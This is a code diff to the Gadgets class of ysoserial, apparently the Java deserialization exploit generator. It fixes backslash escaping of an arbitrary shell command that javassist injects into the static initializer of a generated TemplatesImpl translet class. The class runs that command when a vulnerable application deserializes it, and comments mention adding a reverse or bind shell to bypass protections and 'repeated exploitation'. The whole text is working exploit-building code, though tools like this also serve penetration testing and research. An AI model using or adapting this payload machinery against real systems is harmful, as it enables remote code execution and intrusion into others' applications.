@@ -36,7 +36,7 @@ public class Gadgets {
     static {
         // special case for using TemplatesImpl gadgets with a SecurityManager enabled
         System.setProperty(DESERIALIZE_TRANSLET, "true");
-        
+
         // for RMI remote loading
         System.setProperty("java.rmi.server.useCodebaseOnly", "false");
     }
@@ -113,7 +113,10 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+            "\");";
+        clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
